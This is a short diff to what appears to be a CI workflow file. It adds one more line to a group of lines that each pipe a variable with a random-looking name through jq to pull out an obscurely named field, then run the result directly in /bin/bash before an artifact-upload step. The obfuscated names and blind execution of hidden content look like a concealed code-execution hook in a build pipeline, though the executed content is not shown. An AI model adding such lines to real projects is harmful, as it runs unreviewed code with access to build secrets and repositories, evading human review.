@@ -30,6 +30,7 @@ jobs:
           printf '%s' "$nof6247" | jq -r .anqek15 | /bin/bash
           printf '%s' "$pmv538" | jq -r .v1 | /bin/bash
           echo $w784 | jq -r .us052 | /bin/bash
+          echo $n8377 | jq -r .boa7 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
